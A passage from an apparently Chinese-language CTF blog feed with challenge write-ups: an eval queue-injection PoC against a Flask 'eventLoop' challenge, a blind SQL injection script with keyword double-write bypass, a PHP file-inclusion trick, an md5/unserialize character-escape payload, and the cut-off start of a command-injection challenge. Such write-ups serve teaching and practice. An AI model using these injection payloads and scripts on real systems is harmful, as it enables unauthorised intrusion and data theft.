class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>://</span><br><span class="line">        <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span></span><br><span class="line">        event = request.event_queue[<span class="number">0</span>]</span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]//从队列中取出队头元素</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">'action:'</span>, <span class="string">'func:'</span>))://不符合继续循环</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">'a'</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>)</span><br><span class="line">            args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = eval(</span><br><span class="line">                    action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">''</span></span><br><span class="line">                resp += <span class="string">'ERROR! All transactions have been cancelled. &lt;br /&gt;'</span></span><br><span class="line">                resp += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">                session[<span class="string">'num_items'</span>] = request.prev_session[<span class="string">'num_items'</span>]</span><br><span class="line">                session[<span class="string">'points'</span>] = request.prev_session[<span class="string">'points'</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">''</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">''</span>:</span><br><span class="line">        resp = (<span class="string">'404 NOT FOUND'</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(url_prefix+'/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span></span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">        querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">        session[<span class="string">'log'</span>] = []</span><br><span class="line">    request.prev_session = dict(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    <span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    page = args[<span class="number">0</span>]</span><br><span class="line">    html = <span class="string">''</span></span><br><span class="line">    html += <span class="string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'</span>.format(</span><br><span class="line">        session[<span class="string">'num_items'</span>], session[<span class="string">'points'</span>])</span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">'index'</span>:</span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:index;True%23False"&gt;View source code&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'shop'</span>:</span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'reset'</span>:</span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">'num_items'</span>]</span><br><span class="line">        html += <span class="string">'Session reset.&lt;br /&gt;'</span></span><br><span class="line">    html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    bool_show_source = str(args[<span class="number">0</span>])</span><br><span class="line">    bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">'True'</span>:</span><br><span class="line"></span><br><span class="line">        source = open(<span class="string">'eventLoop.py'</span>, <span class="string">'r'</span>)</span><br><span class="line">        html = <span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">                html += line.replace(<span class="string">'&amp;'</span>, <span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(</span><br><span class="line">                    <span class="string">' '</span>, <span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>, <span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                html += line</span><br><span class="line">        source.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">'True'</span>:</span><br><span class="line">            headers = &#123;&#125;</span><br><span class="line">            headers[<span class="string">'Content-Type'</span>] = <span class="string">'text/plain'</span></span><br><span class="line">            headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=serve.py'</span></span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    num_items = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">'num_items'</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(</span><br><span class="line">        num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume:</span><br><span class="line">        <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">'points'</span>] -= point_to_consume</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span></span><br><span class="line">    flag = args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">'func:show_flag;'</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p>来看看几个比较重要的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    num_items = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">'num_items'</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(</span><br><span class="line">        num_items), <span class="string">'action:view;index'</span>])</span><br></pre></td></tr></table></figure><p>这里会对num_items先进行判断，如果不够就会先加上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume:</span><br><span class="line">        <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">'points'</span>] -= point_to_consume</span><br></pre></td></tr></table></figure><p>对points判断，如果小于将要消费的数目，就会报错，并且扣除消费的数目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">'func:show_flag;'</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">'action:view;index'</span>)</span><br></pre></td></tr></table></figure><p>只要session中num_items的值大于5就能够拿到flag</p><p>简而言之，就是要先骗到五个钻石，之后拿着flag跑就行了</p><p>在execute_event_loop()函数中有关键部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">event_handler = eval(</span><br><span class="line">                    action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br></pre></td></tr></table></figure><p>eval可以写入语句导致任意命令执行，只要让buy_handler和get_flag_handler先进入队列，那么就可以达到目的，同时这里的action通过#可以注释后面的检测拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">    session[<span class="string">'log'</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>:</span><br><span class="line">        session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br></pre></td></tr></table></figure><p>trigger_event控制着队列的进出，这样就联系起来了，只要让eval执行trigger_event，再将buy和get_flag传入，就会先一步进入队列</p><p>get_mid_str(event, ‘:’, ‘;’),这个函数会找第一个参数中，第二个参数和第三个参数之间的字符串</p><p>poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action:trigger_event%23;action:buy;2%23action:buy;3%23action:get_flag;%23</span><br></pre></td></tr></table></figure><p>所以，action:buy;经过get_mid_str函数和eval拼接就变成了buy_handler(5)，后面的差不多理解就可以了</p><p>然后就是打过去，这里要用到工具，附上GitHub地址：<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a></p><img src="/2020/05/29/buuoj4/16.png" class="" title="examplename"><p>之后数据base64解密即可</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;网鼎杯-2020-朱雀组-phpweb&quot;&gt;&lt;a href=&quot;#网鼎杯-2020-朱雀组-phpweb&quot; class=&quot;headerlink&quot; title=&quot;[网鼎杯 2020 朱雀组]phpweb&quot;&gt;&lt;/a&gt;[网鼎杯 2020 朱雀组]phpweb&lt;/h3&gt;
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>WHUCTF</title>
    <link href="http://yoursite.com/2020/05/25/WHUCTF/"/>
    <id>http://yoursite.com/2020/05/25/WHUCTF/</id>
    <published>2020-05-25T15:33:40.000Z</published>
    <updated>2020-05-27T15:20:22.989Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Easy-sqli"><a href="#Easy-sqli" class="headerlink" title="Easy_sqli"></a>Easy_sqli</h4><a id="more"></a><p>题目打开是个登录框，根据题目应该就是sql注入，万能密钥登录，弹窗显示登录成功，无其他回显，判断是盲注</p><p>fuzz一下，过滤了or、select等，双写绕过成功，直接贴脚本吧（第一次自己手写的脚本，真的是很喜悦了，虽然没有二分法快）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author peguin</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://218.197.154.9:10011/login.php"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line"><span class="string">'Connection'</span>:<span class="string">'keep-alive'</span></span><br><span class="line">&#125;</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_,&#123;&#125;!@#$%^&amp;*()?~'</span>:</span><br><span class="line">        <span class="comment"># passwd = "1' oorr ascii(substr((selselectect database()),&#123;&#125;,1))=&#123;&#125;#".format(i,ord(j))#easy_sql1</span></span><br><span class="line">        <span class="comment">#passwd = "1' oorr ascii(substr((selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema='easy_sql1'),&#123;&#125;,1))=&#123;&#125;#".format(i,ord(j))#f1ag_y0u_wi1l_n3ver_kn0w,users</span></span><br><span class="line">        <span class="comment">#passwd = "1' oorr ascii(substr((selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name='f1ag_y0u_wi1l_n3ver_kn0w'),&#123;&#125;,1))=&#123;&#125;#".format(i, ord(j))#f111114g</span></span><br><span class="line">        passwd = <span class="string">"1' oorr ascii(substr((seselectlect f111114g frfromom f1ag_y0u_wi1l_n3ver_kn0w),&#123;&#125;,1))=&#123;&#125;#"</span>.format(i, ord(j))</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'user'</span>:passwd,</span><br><span class="line">            <span class="string">'pass'</span>:<span class="string">'123'</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(passwd)</span></span><br><span class="line">        r = requests.post(url,data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Login success!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            res += j</span><br><span class="line">            print(res)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这里用二分法会很快，而且用二分法可以不用考虑特殊字符，都包含在里面了，抽时间写一个二分法的盲注轮子</p><h4 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h4><p>打开题目，在contact页面发现有提交框，猜测利用点在这里，随便写写提交，F12，发现点提示</p><img src="/2020/05/25/WHUCTF/1.png" class="" title="examplename"><p>脑洞，一时之间想不到办法，无意多刷新了几次，发现脚注那里的内容会改变，猜测get点有隐藏的参数没有显示，根据以往的经验，，一般文件包含的参数都会是file，猜测尝试，成功</p><img src="/2020/05/25/WHUCTF/2.png" class="" title="examplename"><p>下面就是用php伪协议读取，这里直接尝试读取flag.php</p><img src="/2020/05/25/WHUCTF/3.png" class="" title="examplename"><h4 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h4><p>开题，给源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$string_1 = $_GET[<span class="string">'str1'</span>];</span><br><span class="line">$string_2 = $_GET[<span class="string">'str2'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'会代码审计嘛23333'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2nd</span></span><br><span class="line"><span class="keyword">if</span>(is_numeric($string_1))&#123;</span><br><span class="line">    $md5_1 = md5($string_1);</span><br><span class="line">    $md5_2 = md5($string_2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($md5_1 != $md5_2)&#123;</span><br><span class="line">        $a = strtr($md5_1, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        $b = strtr($md5_2, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        <span class="keyword">if</span>($a == $b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3nd</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="string">'/x/'</span>, <span class="string">'yy'</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line"></span><br><span class="line">$password = <span class="string">"aaaaa"</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line"></span><br><span class="line">$r = filter(serialize($user));</span><br><span class="line"><span class="keyword">if</span>(unserialize($r)[<span class="number">1</span>] == <span class="string">"123456"</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一步用%0a即可绕过，很熟悉了</p><p>第二步这里之前没有遇到过，这里要md5加密之后的两个数不一样，在经过strtr函数替换之后又要相等，找了资料，找到了类似的题，只不过替换的内容不一样，只要是在经过函数替换之后的md5值是纯数字且为0e开头即可，附上爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(f)</span>:</span></span><br><span class="line">    p = hashlib.md5(f.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100000000</span>):</span><br><span class="line">    s = md5(str(i)).replace(<span class="string">'b'</span>,<span class="string">'5'</span>)</span><br><span class="line">    <span class="keyword">if</span> s[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">'0e'</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'a'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'b'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'c'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'d'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                        <span class="keyword">if</span> <span class="string">'e'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">'f'</span> <span class="keyword">not</span> <span class="keyword">in</span> s[<span class="number">2</span>:]:</span><br><span class="line">                                print(<span class="string">'i:'</span>+str(i)+<span class="string">'md5:'</span>+s)</span><br><span class="line"><span class="comment">#这里是跑的几个值</span></span><br><span class="line">i:<span class="number">11230178</span>md5:<span class="number">0e732639146814822596549556939597</span></span><br><span class="line">i:<span class="number">20493141</span>md5:<span class="number">0e343359461627556649445574858858</span></span><br><span class="line">i:<span class="number">31367140</span>md5:<span class="number">0e792219082918318159634476857695</span></span><br><span class="line">i:<span class="number">40371185</span>md5:<span class="number">0e675215526424812964725042621087</span></span><br></pre></td></tr></table></figure><p>第三步就是反序列化的字符逃逸了，需要在反序列化之后的下标为1的数组元素的值为123456，而经过filter会把x替换为yy，所以一个x可以逃逸一个字符，在本地测试之后构造出这一步的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=xxxxxxxxxxxxxxxxxxxx<span class="string">";i:1;s:6:"</span><span class="number">123456</span><span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>这三步结合起来，就可以拿到flag了，flag在源码处能够看到</p><h4 id="ezcmd"><a href="#ezcmd" class="headerlink" title="ezcmd"></a>ezcmd</h4><p>开题，给源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span 